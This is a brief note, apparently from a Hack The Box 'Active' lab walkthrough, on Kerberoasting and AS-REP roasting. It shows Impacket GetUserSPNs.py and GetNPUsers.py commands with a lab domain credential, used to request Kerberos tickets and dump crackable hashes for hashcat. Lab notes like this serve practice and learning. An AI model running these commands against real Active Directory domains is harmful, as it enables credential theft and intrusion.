--> Kerberost open kerbs to pull hashes!!
--> you need a user account password to do this!!!
--> Also not this might not always work, try multiple times and if it still doesn't work give it like 10 min and try again!!!

```
python GetUserSPNs.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request
```


--> With this you could enmurate domain user names if you have credentials, or if you have a user list of guessed username

```
GetNPUsers.py 'active.htb/SVC_TGS:GPPstillStandingStrong2k18' -dc-ip 10.10.10.100 -request -format hashcat -outputfile test
```



